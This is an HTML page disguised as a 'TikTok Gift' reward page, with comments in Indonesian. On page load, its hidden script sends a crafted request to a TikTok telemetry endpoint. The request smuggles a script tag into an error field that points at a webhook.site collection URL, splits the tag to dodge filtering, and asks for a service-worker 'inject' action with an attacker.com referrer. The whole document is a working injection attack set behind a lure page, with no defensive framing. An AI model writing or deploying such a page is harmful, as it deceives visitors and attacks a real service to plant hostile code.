<!DOCTYPE html>
<html>
<head>
    <title>TikTok Gift</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h1>You've received a TikTok Gift! 🎁</h1>
        <p>Loading your reward...</p>
    </div>

    <script>
        // Pakai fungsi ini supaya script-nya nggak "muntah" di layar lagi
        (function() {
            const targetUrl = "https://mcs-sg.tiktok.com/v1/list";
            const webhookUrl = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

            // Kita buat payload-nya lebih simpel supaya nggak bentrok sama tag HTML
            const payload = {
                "app_id": 1180,
                "dict": {
                    "error_detail": "<scr"+"ipt src='" + webhookUrl + "'></scr"+"ipt>",
                    "X-Pns-Referrer": "https://attacker.com"
                },
                "data": [{
                    "e": "service_worker_rule_sync",
                    "t": Date.now(),
                    "d": { "action": "inject" }
                }]
            };

            fetch(targetUrl, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "text/plain" },
                body: JSON.stringify(payload)
            })
            .then(() => console.log("Success!"))
            .catch(() => console.log("Error"));
        })();
    </script>
</body>
</html>
